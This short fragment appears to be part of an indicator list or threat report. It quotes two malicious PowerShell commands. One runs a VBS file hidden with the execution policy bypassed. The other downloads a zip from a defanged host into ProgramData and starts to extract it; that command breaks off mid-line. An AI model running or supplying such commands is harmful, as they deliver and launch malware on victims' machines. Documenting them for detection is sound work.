  - powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\\Users\\Public\\Ab.vbs"
  - powershell.exe -Command "& {Invoke-WebRequest -Uri \"hxxps://guilloton.fr/x.zip\"
    -OutFile \"$env:ProgramData\\ali.zip\"; Expand-Archive -Path \"$env:ProgramData\\ali.zip\"
